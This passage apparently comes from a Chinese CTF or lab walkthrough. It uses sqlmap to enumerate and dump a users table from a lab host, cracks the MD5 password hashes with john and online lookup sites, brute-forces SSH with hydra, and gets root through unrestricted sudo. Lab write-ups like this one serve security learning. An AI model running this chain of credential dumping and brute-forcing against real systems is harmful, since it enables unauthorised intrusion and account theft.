成功登录

## 漏洞利用

使用sqlmap跑一下，使用burp抓包，将数据包保存并命名为sql.txt  
暴库

```
sqlmap -r sql.txt --dbs
```

![](../Images/6e169c12322f826e8536071bc99dfb4d.png)

  

![](../Images/8efe2e4ceaead48949dfd28ea1c2d2c7.png)

  

  

爆表

```
sqlmap -r sql.txt -D website --tables
```

![](../Images/c1293cecfd3561d5a85ceafc9ac64f82.png)

  

  

暴字段

```
sqlmap -r sql.txt -D website -T users --columns
```

![](../Images/c3ca40430c981465e327aa7d4430de62.png)

  

  

拖库

```
sqlmap -r sql.txt -D website -T users -C username,password --dump
```

![](../Images/a5dc856c78e99d1b28f02bf29fe3f1aa.png)

  

  

将用户名和密码拖下来分别保存为username.txt和password.txt，使用john破解密码

```
john --format=Raw-MD5 password.txt
```

![](../Images/6886e4fe59421a42e4a0c3db2c99d955.png)

  

太慢了还是使用网站

*   https://www.cmd5.com/
    
*   https://www.somd5.com/
    

最终结果

![](../Images/54df7d5e84718b86e0a1c2a36f9e11ae.png)

  

将得到的明文密码保存为password2.txt，使用hydra进行爆破

```
hydra -L username.txt -P password2.txt -t 4 192.168.1.136 ssh
```

![](../Images/b0ca2ce361a892b54eaee7e08ec391bb.png)

  

  

在前面的端口扫描中我们看到开放了22-SSH端口，尝试登录，登录成功。  

![](../Images/ff8c13a4b4bc20fb0f436cac62d39961.png)

  

## 提权

查看当前用户可以使用的sudo权限

```
sudo -l
```

![](../Images/c1c8200f49dbe6ceb60fb3cf2157ebe2.png)

  

可以看到当前用户可以以root身份运行所有命令

  

尝试使用`sudo su`提升权限，成功拿到root权限

```
sudo su
```
